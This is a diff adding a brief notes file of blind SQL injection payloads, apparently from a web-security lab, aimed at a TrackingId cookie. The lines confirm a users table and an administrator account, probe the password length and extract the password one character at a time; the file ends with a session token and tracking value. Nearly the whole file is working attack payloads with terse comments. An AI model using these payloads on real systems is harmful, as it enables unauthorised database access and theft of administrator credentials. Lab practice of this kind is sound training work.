@@ -1,0 +1,16 @@
+//blind sql injection
+
+' TrackingId=yQ9r4JqMXLriasIA' AND '1'='1
+
+' TrackingId=yQ9r4JqMXLriasIA' AND '1'='2
+
+TrackingId=yQ9r4JqMXLriasIA' AND (SELECT 'a' FROM users LIMIT 1)='a    //verify there is a users table
+
+TrackingId=yQ9r4JqMXLriasIA' AND (SELECT 'a' FROM users WHERE username='administrator')='a   //verify there is a user named administrator
+
+TrackingId=yQ9r4JqMXLriasIA' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a   //password is greater than the specified length
+
+TrackingId=yQ9r4JqMXLriasIA' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a   //cycle through each position and possible value
+
+session:"FzSZifUmDY5gIPRd50hT3rerz9q2dqDu"
+TrackingId:"Qz0t07rLl3gIdr1i"
